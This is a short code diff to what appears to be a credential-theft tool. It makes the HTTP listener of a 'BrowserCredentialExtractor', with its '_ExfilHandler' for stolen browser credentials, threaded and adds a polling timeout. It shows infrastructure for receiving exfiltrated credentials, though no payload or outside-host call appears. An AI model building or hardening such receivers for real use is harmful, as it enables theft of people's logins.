@@ -14,9 +14,15 @@ import json
 import time
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
 from urllib.parse import parse_qs, urlparse
 
 from .config import log
+
+
+class _ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
+    """HTTP server that handles each request in a new thread."""
+    daemon_threads = True
 
 
 class _ExfilHandler(BaseHTTPRequestHandler):
@@ -120,8 +126,8 @@ class BrowserCredentialExtractor:
 
         self._running = True
 
-        # Create HTTP server
-        self._server = HTTPServer(
+        # Create HTTP server (threaded to handle concurrent connections)
+        self._server = _ThreadingHTTPServer(
             (self.listen_host, self.listen_port), _ExfilHandler
         )
         self._server.credential_callback = self._on_credential_received
@@ -137,6 +143,7 @@ class BrowserCredentialExtractor:
 
     def _serve(self):
         """Run HTTP server until stopped."""
+        self._server.timeout = 1.0  # Allow periodic check of self._running
         while self._running:
             self._server.handle_request()
 
